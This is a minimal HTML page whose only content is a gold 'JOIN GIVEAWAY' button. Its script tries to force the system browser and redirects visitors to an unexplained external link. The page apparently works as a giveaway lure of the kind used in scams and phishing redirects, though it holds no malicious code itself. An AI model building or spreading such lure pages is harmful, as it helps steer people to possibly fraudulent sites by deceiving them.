<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Join Giveaway</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #ffffff; /* White background */
      font-family: Arial, sans-serif;
    }

    .btn {
      background: linear-gradient(135deg, #d4af37, #f5d76e); /* Golden gradient */
      border: none;
      border-radius: 12px;
      padding: 20px 50px;
      font-size: 28px;
      font-weight: bold;
      color: white;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 8px 20px rgba(0,0,0,0.25);
    }

    .btn:hover {
      background: linear-gradient(135deg, #f5d76e, #d4af37);
      transform: translateY(-3px);
      box-shadow: 0 12px 25px rgba(0,0,0,0.35);
    }
  </style>
</head>
<body>
  <button class="btn" onclick="openInBrowser()">JOIN GIVEAWAY</button>

  <script>
    function openInBrowser() {
      // Try system-level browser first
      window.open("https://passwordomain.com/1838319", "_system");

      // Fallback: new window/tab
      window.location.href = "https://passwordomain.com/1838319";
    }
  </script>
</body>
</html>
